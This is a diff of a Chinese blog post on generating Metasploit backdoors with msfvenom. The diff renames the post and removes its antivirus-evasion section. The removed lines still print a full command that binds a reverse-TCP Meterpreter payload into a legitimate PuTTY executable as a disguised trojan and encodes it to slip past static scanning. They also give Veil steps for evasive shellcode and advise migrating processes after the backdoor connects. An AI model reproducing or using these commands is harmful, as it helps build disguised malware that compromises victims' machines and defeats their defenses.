@@ -81,14 +81,14 @@
 
 
 
-<meta name="description" content="MSF后门生成命令简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出">
+<meta name="description" content="MSF后门生成&amp;amp;监听简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF后门生成命令">
+<meta property="og:title" content="MSF后门生成命令&amp;监听">
 <meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;19&#x2F;MSF%E5%90%8E%E9%97%A8&#x2F;index.html">
 <meta property="og:site_name" content="白仁的博客">
-<meta property="og:description" content="MSF后门生成命令简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出">
+<meta property="og:description" content="MSF后门生成&amp;amp;监听简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-08-25T08:03:26.211Z">
+<meta property="og:updated_time" content="2021-08-26T08:05:29.457Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -125,7 +125,7 @@
 
 
 
-  <title>MSF后门生成命令 | 白仁的博客</title>
+  <title>MSF后门生成命令&监听 | 白仁的博客</title>
   
 
 
@@ -259,7 +259,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSF后门生成命令</h1>
+          <h1 class="post-title" itemprop="name headline">MSF后门生成命令&监听</h1>
         
 
         <div class="post-meta">
@@ -331,7 +331,7 @@
       
 
       
-        <h1 id="MSF后门生成命令"><a href="#MSF后门生成命令" class="headerlink" title="MSF后门生成命令"></a>MSF后门生成命令</h1><p>简单的记录一下。</p>
+        <h1 id="MSF后门生成-amp-监听"><a href="#MSF后门生成-amp-监听" class="headerlink" title="MSF后门生成&amp;监听"></a>MSF后门生成&amp;监听</h1><p>简单的记录一下。</p>
 <h2 id="0x00-MSFVenom参数"><a href="#0x00-MSFVenom参数" class="headerlink" title="0x00 MSFVenom参数"></a>0x00 MSFVenom参数</h2><p>MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下： </p>
 <table>
 <thead>
@@ -424,20 +424,7 @@
 
 
 
-<h2 id="0x03-免杀"><a href="#0x03-免杀" class="headerlink" title="0x03 免杀"></a>0x03 免杀</h2><h3 id="00-自捆绑-编码免杀"><a href="#00-自捆绑-编码免杀" class="headerlink" title="00 自捆绑+编码免杀"></a>00 自捆绑+编码免杀</h3><p>使用msfvenom生成木马的时候使用<strong>-x捆绑一个正常的软件</strong>，类似于生成图片马，将恶意攻击payload镶进软件内。然后再对木马进行编码，命令如下：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<span class="number">172</span>.<span class="number">16</span>.<span class="number">143</span>.<span class="number">135</span> LPORT=<span class="number">4444</span> -e x86/shikata_ga_nai -x puttyel.exe -i <span class="number">15</span> - f exe -o fake_puttyel.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>msfvenom –list encoders：查看msfvenom自带的编码器，可以看到x86/shikata_ga_nai编码器是评级为x86里面唯一excellent的，所以也是编码中使用最多的；-e, –encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码 ；-i，指定编码次数。</p>
-</blockquote>
-<p> 能过360纯静态查杀，但时隔1分钟左右会被行为检测、动态检测查杀。所以<strong>上线以后及时做进程迁移</strong>。 </p>
-<h3 id="01-veil-mingw-w64"><a href="#01-veil-mingw-w64" class="headerlink" title="01 veil+mingw-w64"></a>01 veil+mingw-w64</h3><p>veil是一个专门拿来做免杀的渗透框架。veil有两个<strong>免杀模块，Evasion和Ordnance</strong>，我们多用Evasion来做文件免杀。 veil使用docker镜像安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line">docker run -it -v /tmp/veil -output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
-
-<p>用<strong>veil生成shellcode然后使用mibgw-264（windows下的gcc) 去加载</strong>。veil生成shellcode：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use <span class="number">1</span>（选择Evasion模块)</span><br><span class="line">use <span class="number">7</span> (选择payload)</span><br><span class="line"><span class="built_in">set</span> LHOST Attack IP</span><br><span class="line"><span class="built_in">set</span> LPORT Atack port</span><br><span class="line">gengrate</span><br></pre></td></tr></table></figure>
-
-<p>安装好mibgw-264进行编译即可，生成msf66.exe。百度<strong>找到mibgw-264这个安装包，然后在其bin目录下找到gcc.exe即可使用</strong>。生成的exe即是免杀后门，双击执行，msf可成功上线，然后进行迁移进程即可。 </p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>无聊。</p>
 
       
     </div>
@@ -604,7 +591,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF后门生成命令"><span class="nav-number">1.</span> <span class="nav-text">MSF后门生成命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-MSFVenom参数"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 MSFVenom参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后门生成"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 后门生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-监听端口"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 监听端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-自捆绑-编码免杀"><span class="nav-number">1.4.1.</span> <span class="nav-text">00 自捆绑+编码免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-veil-mingw-w64"><span class="nav-number">1.4.2.</span> <span class="nav-text">01 veil+mingw-w64</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF后门生成-amp-监听"><span class="nav-number">1.</span> <span class="nav-text">MSF后门生成&amp;监听</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-MSFVenom参数"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 MSFVenom参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后门生成"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 后门生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-监听端口"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 监听端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 总结</span></a></li></ol></li></ol></div>
             
 
           </div>
